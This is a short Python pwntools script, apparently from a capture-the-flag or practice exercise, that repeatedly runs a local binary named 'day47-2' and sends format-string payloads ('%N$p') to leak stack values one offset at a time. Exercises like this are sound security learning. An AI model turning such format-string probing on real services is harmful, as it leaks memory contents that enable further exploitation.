from pwn import *

context.binary = "./day47-2"
context.log_level = "error"

for i in range(1, 80):
	p = process("./day47-2")

	payload = f"%{i}$p".encode()
	p.recvuntil(b"review:\n")
	p.sendline(payload)
	p.recvuntil(b"guest says: ")
	out = p.recvline()
	print(i, out)
	p.close()
